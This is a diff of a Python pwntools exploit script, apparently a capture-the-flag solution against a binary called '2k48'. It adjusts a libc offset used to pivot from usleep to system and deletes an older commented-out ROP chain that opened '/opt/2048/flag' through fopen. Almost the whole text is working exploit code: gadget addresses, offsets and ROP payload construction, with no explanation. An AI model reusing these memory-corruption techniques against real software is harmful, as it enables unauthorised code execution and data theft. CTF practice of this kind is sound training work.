@@ -2,8 +2,9 @@
 
 from pwn import *
 import time
+
 #p = process('telnet.sh')
-#usleepToSystemOffset = -0xa54a0 #find this by leaking libc
+#usleepToSystemOffset = -0x224b0 #find this by leaking libc
 
 p = process('2k48')
 usleepToSystemOffset = -0xa54a0
@@ -76,29 +77,6 @@ ropchain += "BBBBCCCCDDDD"
 ropchain += 'X'*(roplen-len(ropchain))
 ropchain += 'Z'*12
 ropchain += flag
-
-
-'''
-roplen = 0x30
-flagloc = p32(newstackloc + roplen - 0x10)
-modeloc = p32(newstackloc + roplen)
-ebx = p32(binary+0x4f48)
-popebxret = p32(binary+0x951)
-fopen = p32(binary+0xa98)
-flag = '/opt/2048/flag\0A' #16 bytes
-mode = 'r\0AAAAAAAAAA' #12 bytes
-ropchain = 'Z'*(28)
-ropchain += popebxret
-ropchain += ebx
-ropchain += fopen
-ropchain += "AAAA" #fopen return
-ropchain += flagloc
-ropchain += modeloc
-ropchain += "BBBBCCCCDDDD"
-ropchain += 'X'*(roplen-len(ropchain))
-ropchain += flag
-ropchain += mode
-'''
 
 if '\n' in ropchain:
     print "ERROR. Newline in ropchain. Bail."
